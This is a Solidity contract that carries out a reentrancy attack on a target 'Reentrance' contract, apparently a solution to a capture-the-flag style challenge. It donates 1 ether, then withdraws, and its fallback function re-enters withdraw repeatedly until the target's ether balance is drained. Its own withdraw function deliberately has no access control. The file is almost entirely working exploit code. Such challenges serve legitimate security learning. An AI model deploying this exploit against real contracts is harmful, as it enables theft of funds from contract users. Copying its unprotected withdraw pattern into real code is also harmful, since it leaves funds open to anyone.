// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import {Reentrance} from "./Reentrance.sol";

contract ReentranceHackDan {
    Reentrance reentranceContract;

    constructor(address _reentranceContractAddress) payable {
        reentranceContract = Reentrance(payable(_reentranceContractAddress));
    }

    function pwnContract() external {
        reentranceContract.donate{value: 1 ether}(address(this));
        reentranceContract.withdraw(1 ether);
    }

    // Don't need access control to pass 
    function withrawEther() external {
        (bool success, ) = (msg.sender).call{value: address(this).balance}("");
        require(success, "Ether transfer failed");
    }

    fallback() external payable {
        uint256 balance = address(reentranceContract).balance;

        if(balance > 1 ether) {
            reentranceContract.withdraw(1 ether);
        }
        else if (balance > 0) {
            reentranceContract.withdraw(balance);
        }
    }
}
